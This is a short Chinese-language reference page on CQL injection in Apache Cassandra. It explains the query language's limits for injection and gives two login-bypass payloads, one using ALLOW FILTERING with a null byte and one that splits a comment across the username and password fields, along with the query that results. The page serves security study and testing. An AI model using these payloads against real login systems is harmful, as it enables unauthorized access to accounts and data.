# Cassandra 注入

> Apache Cassandra 是一个免费且开源的分布式宽列存储 NoSQL 数据库管理系统。

## 概述

* [CQL 注入限制](#cql注入限制)
* [Cassandra 注释](#cassandra注释)
* [绕过 Cassandra 登录](#绕过cassandra登录)
    * [示例 #1](#示例-1)
    * [示例 #2](#示例-2)
* [参考](#参考)

## CQL 注入限制

* Cassandra 是一种非关系型数据库，因此 CQL 不支持 `JOIN` 或 `UNION` 语句，这使得跨表查询更具挑战性。

* 此外，Cassandra 缺乏方便的内置函数，如 `DATABASE()` 或 `USER()` 来检索数据库元数据。

* 另一个限制是 CQL 中缺少 `OR` 运算符，这阻止了创建始终为真的条件；例如，像这样的查询 `SELECT * FROM table WHERE col1='a' OR col2='b';` 将被拒绝。

* 基于时间的 SQL 注入通常依赖于 `SLEEP()` 等函数来引入延迟，在 CQL 中也很难执行，因为它没有 `SLEEP()` 函数。

* CQL 不允许子查询或其他嵌套语句，因此像这样的查询 `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` 将被拒绝。

## Cassandra 注释

```sql
/* Cassandra 注释 */
```

## 绕过 Cassandra 登录

### 示例 #1

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

### 示例 #2

```sql
username: admin'/*
password: */and pass>'
```

注入看起来像以下 SQL 查询：

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
``` 

## 参考

* [Cassandra 注入漏洞触发 - DATADOG - 2023 年 1 月 30 日](https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)
* [调查 Apache Cassandra 的 CQL 注入 - Mehmet Leblebici - 2022 年 12 月 2 日](https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra/)